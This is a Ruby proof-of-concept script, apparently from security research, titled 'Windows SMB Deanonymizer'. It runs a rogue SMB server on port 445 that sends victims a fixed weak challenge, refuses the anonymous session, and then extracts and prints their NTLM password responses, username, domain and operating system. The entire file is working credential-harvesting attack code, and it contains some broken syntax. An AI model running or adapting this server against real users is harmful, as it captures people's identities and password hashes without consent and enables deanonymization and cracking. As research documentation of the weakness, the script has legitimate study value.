# Windows SMB Deanonymizer
# Elie Bursztein contact@elie.net
# Based on Hernan Ochoa (hernan@gmail.com) poc for smb weak challenge
# See https://elie.net/blog/security/identifying-internet-explorer-user-with-a-smb-query/
require 'socket'
require 'time'


# from metasploit...
# framework-3.2/lib/rex/proto/smb/utils.rb
def time_unix_to_smb(unix_time)
	t64 = (unix_time + 11644473600) * 10000000
	thi = (t64 & 0xffffffff00000000) >> 32
	tlo = (t64 & 0x00000000ffffffff)
	return [thi, tlo]
end

def snoop()

	conn_num = 0
	maxn = 42


	neg_proto_response_1 =
	"00000051" + # NetBIOS Session Service header
	"ff534d4272000000008801c00000000000000000000000000000fffe00000000" + # SMB Header
	"1105000302000100041100000000010000000000fde30000007632d28015ca010000080c00e486962656d5869400000000"  # Negotiate Protocol Response

	session_setupandx_access_denied =
	"00000023" + # NetBIOS Session Service Header
	"ff534d4273220000c08801c00000000000000000000000000000fffe00000400000000" + # SMB Header
	"000000" # Session and SetupX Response payload







	server = TCPServer.open(445)
	loop {

		if conn_num > maxn
			Thread.exit
			return
		end

		Thread.start(server.accept) do |client|

			conn_num = conn_num + 1
			if conn_num > maxn
				puts "done!"
				client.close()
				server.shutdown
				Thread.exit
				return
			end
			puts conn_num


			# (1) receive Negotiate Protocol Request

			q, x = client.recvfrom(2000)
			puts "neg proto request received"
			pid1 = q[0x1e]
			pid2 = q[0x1f]
			multi1 = q[0x1e+4]
			multi2 = q[0x1f+4]

			# (2) send Negotiate Protocol Response

			# set challenge in response packet
			neg_proto_response_1[146..146+15] = "004e4b3a02d67f7e"
			# TODO: SET CORRECT TIME
			timehi, timelo = time_unix_to_smb(Time.now.to_i)
			# send packet
			n = neg_proto_response_1.scan(/../).map { |s| s.to_i(16) }
			# set process id
			#puts pid1
			#puts pid2
			#puts multi1
			#puts multi2
			n[0x1e] = pid1
			n[0x1f] = pid2
			n[0x1e+4] = multi1
			n[0x1f+4] = multi2

			s = ("%.8x" % timelo)
			ss = s[6].chr + s[7].chr + s[4].chr + s[5].chr + s[2].chr + s[3].chr + s[0].chr + s[1].chr

			dlo = (ss.scan(/../)).map { |s| s.to_i(16) }

			s = ("%.8x" % timehi)
			ss = s[6].chr + s[7].chr + s[4].chr + s[5].chr + s[2].chr + s[3].chr + s[0].chr + s[1].chr

			dhi = (ss.scan(/../)).map { |s| s.to_i(16) }

			n[0x3c..0x3c+3] = dlo
			n[0x40..0x40+3] = dhi

			# timezone = 0
			#n[0x45] = 0
			#n[0x46] = 0
			j = n.pack("C*")
			client.write(j)
			puts "neg proto response sent"

			# (3) Receive Session Setup andX Request
			q, x = client.recvfrom(4000)
			puts "session setup and request received!"
			pid1 = q[0x1e]
			pid2 = q[0x1f]
			multi1 = q[0x1e+4]
			multi2 = q[0x1f+4]

			# we assume the first request is anonymous
			# and we send back an Error: STATUS_ACCESS_DENIED
			n = session_setupandx_access_denied.scan(/../).map { |s| s.to_i(16) }
			n[0x1e] = pid1
			n[0x1f] = pid2
			n[0x1e+4] = multi1
			n[0x1f+4] = multi2
			#n[0x44/2] = pid1multi1
			#n[0x45/2] = multi2
			#n[0x3c/2] = pid1
			#n[0x3d/2] = pid2
			#puts n

			begin
				j = n.pack("C*")
			rescue
				puts $!
			end

			client.write(j)
			puts "session setup and access denied sent!"

			# (4) Receive Session Setup andX Request with creds
			q, x = client.recvfrom(4000)
			puts "session setup andx request with creds received!"




			##constant
			ansi_pwd_start = 0x41
			ansi_pwd_len  =  0x17




			# Get the ANSI Password
			ansi_pwd = q[ansi_pwd_start..ansi_pwd_start + ansi_pwd_len]
			ansi_pwd_s = (ansi_pwd.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }).to_s
			puts "ansi " + ansi_pwd_s


			unicode_pwd_start = 0x59

			#Ugly hack we need more parsing to make this more robust:
			#FIXME compute the size of the unicode password here to deal with unicode
			#l = q[0x3B]

			ntlm_version = 2

			if ansi_pwd_s=~ /[1-9]/
				unicode_pwd_len = 0x17
				ntlm_version = 1
				puts "NTLM v1 auth"
			else
				unicode_pwd_len = 0x37
				puts "NTLM v2 auth"
			end

			##unicode password

			#unicode_pwd_len = 0x17
			#unicode_pwd_len = 0x36

			#puts unicode_pwd_start.to_s + ":" +  unicode_pwd_len.to_s


			# Get the Unicode Password
			unicode_pwd = q[unicode_pwd_start..unicode_pwd_start + unicode_pwd_len]
			unicode_pwd_s = (unicode_pwd.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }).to_s
			puts "unicode " +  unicode_pwd_s


			#username start
			username_start = unicode_pwd_start + unicode_pwd_len + 1

			i = 0
			v = 0

			#puts "1"


			username = ""
			while v == 0
				#puts i.to_s
				if q[username_start + i] == 0 and q[username_start + i + 1] == 0
					v = 1
				#	puts "finito:" + username_start.to_s + ":" + i.to_s
				end
				if q[username_start +i] != 0
					username = username + q[username_start + i].chr
				#	puts "next:" + username_start.to_s + ":" + i.to_s
				end
				i = i + 1
			end

			#puts "b"

			i = username_start + i + 1
			domain = ""
			v = 0
			k = 0
			while v == 0:
				if q[i+k] == 0 and q[i+k+1] == 0
					v = 1
				end
				if q[i+k] != 0
					domain = domain + q[i+k].chr
				end
				k = k + 1
			end

			k = i + k + 1

			os = ""
			if ntlm_version == 1
				os = ""

				v = 0
				l = 0
				while v == 0:
					if q[k+l] == 0 and q[k+l+1] == 0
						v = 1
					end
					if q[k+l] != 0
						os = os + q[k+l].chr
					end
					l = l + 1
				end
			end

			puts "user: " + username
			puts "domain: " + domain
			puts "os: " + os
			if (username.length > 0)
				#mission accomplish
				exit #create a popup that it is not accessible without it you get an auth request.
				#sleep(300)
			end
		end
 	}

end


# MAIN
	print "Windows SMB Deanonymizer"
	print "\n 2010 Elie Bursztein contact@elie.net"
	print "\n Based on Hernan Ochoa (hernan@gmail.com) poc for smb weak challenge\n"


	puts "waiting for connections from victim"
	snoop()
